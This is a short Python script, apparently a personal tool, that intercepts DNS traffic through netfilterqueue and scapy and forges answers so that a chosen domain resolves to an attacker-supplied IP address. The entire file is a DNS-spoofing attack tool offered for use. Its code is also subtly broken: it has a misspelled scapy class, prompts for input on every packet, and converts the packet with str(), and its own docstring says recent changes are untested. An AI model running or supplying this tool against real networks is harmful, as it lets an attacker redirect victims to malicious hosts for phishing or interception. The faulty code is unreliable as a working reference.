#!/usr/bin/env python
"""
Check packets for DNS requests containing "www.bing.com" and replace
response with another IP
johnroge AT outlook
v1.1
Last updated: Oct 2018
NOTE: Latest changes (variable inputs for host and address) not yet
        tested due to netfilterqueue issues.
"""
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    host = input('Please enter a host or domain to highjack: ')
    IP_address = input('Enter IP address to substitute for the host: ')

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if host in qname:
            print("[+] Spoofing target")
            answer = scapy.DNRR(rrname=qname, rdata=IP_address)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
